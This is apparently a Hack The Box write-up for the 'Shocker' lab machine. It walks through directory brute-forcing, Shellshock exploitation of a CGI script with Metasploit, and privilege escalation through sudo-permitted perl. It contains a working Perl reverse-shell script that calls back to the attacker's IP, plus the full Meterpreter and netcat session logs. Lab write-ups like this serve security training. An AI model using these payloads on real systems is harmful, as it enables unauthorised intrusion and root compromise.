# Shocker - 10.10.10.56

## Scanning
```
nmap -sS -sU -T4 -A -p-
```
```
services -R 10.10.10.56

Services
========

host     	port  proto  name      	state  info
----     	----  -----  ----      	-----  ----
10.10.10.56  80	tcp	http      	open   
10.10.10.56  2222  tcp	ethernetip-1  open   
 ```
 Sweet, see what we can find on the web server
```
uniscan -u 10.10.10.56 -qweds

dirb http://10.10.10.56 /usr/share/dirb/wordlists/

dirb http://10.10.10.56 /usr/share/dirb/wordlists/vulns/apache.txt

dirb http://10.10.10.56 /usr/share/dirbuster/wordlists/apache-user-enum-1.0.txt

dirb http://10.10.10.56 /usr/share/dirb/wordlists/vulns/cgis.txt
```

Get a hit. That's when I finally figured that machine name kinda gives [the vulnerability](https://www.rapid7.com/db/modules/exploit/multi/http/apache_mod_cgi_bash_env_exec) away.
```
+ http://10.10.10.56/cgi-bin/ (CODE:403|SIZE:294)
```
> When a web server uses the Common Gateway Interface (CGI) to handle a document request, it copies certain information from the request into the environment variable list and then delegates the request to a handler program. If the handler is a Bash script, or if it executes one for example using the system(3) call, Bash will receive the environment variables passed by the server and will process them as described above. This provides a means for an attacker to trigger the Shellshock vulnerability with a specially crafted document request.
> [*-- Wiki*][1]

### Search for shell files
```shell
root@kingpin:/ dirbuster
Starting OWASP DirBuster 1.0-RC1
Starting dir/file list based brute forcing
File found: /cgi-bin/user.sh - 200
```
Verify vulnerability and exploit.
```
msf auxiliary(apache_optionsbleed) > use auxiliary/scanner/http/apache_mod_cgi_bash_env
msf auxiliary(apache_mod_cgi_bash_env) > set rhosts 10.10.10.56
rhosts => 10.10.10.56
msf auxiliary(apache_mod_cgi_bash_env) > set targeturi cgi-bin/user.sh
targeturi => cgi-bin/user.sh
msf auxiliary(apache_mod_cgi_bash_env) > run

[+] uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)

msf auxiliary(apache_mod_cgi_bash_env) > use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf exploit(apache_mod_cgi_bash_env_exec) > set targeturi cgi-bin/user.sh
targeturi => cgi-bin/user.sh
msf exploit(apache_mod_cgi_bash_env_exec) > run

[*] Started reverse TCP handler on 10.10.14.195:4444
[*] Command Stager progress - 100.46% done (1097/1092 bytes)
[*] Sending stage (826872 bytes) to 10.10.10.56
[*] Meterpreter session 1 opened (10.10.14.195:4444 -> 10.10.10.56:48782) at 2017-11-01 00:40:52 -0400
meterpreter >
```
## Privesc

### Enumeration

[LinEnum](https://github.com/rebootuser/LinEnum) is pretty awesome.
```
...
Matching Defaults entries for shelly on Shocker:
	env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
	(root) NOPASSWD: /usr/bin/perl
...
```
This implies that suid bit is set.

Make a simple perl reverse shell
```perl
use Socket;$i="10.10.14.195";$p=1337;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){
  open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");
};

```
Set up a listener and execute a shell
```
meterpreter > upload /root/sh.pl
[*] uploading  : /root/sh.pl -> sh.pl
[*] uploaded   : /root/sh.pl -> sh.pl
meterpreter > shell
Process 6773 created.
Channel 3 created.
sudo /usr/bin/perl sh.pl
```
```
root@kingpin:~# nc -l -p 1337 -vvv
listening on [any] 1337 ...
10.10.10.56: inverse host lookup failed: Unknown host
connect to [10.10.14.195] from (UNKNOWN) [10.10.10.56] 53562
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```




[1]:https://en.wikipedia.org/wiki/Shellshock_(software_bug)
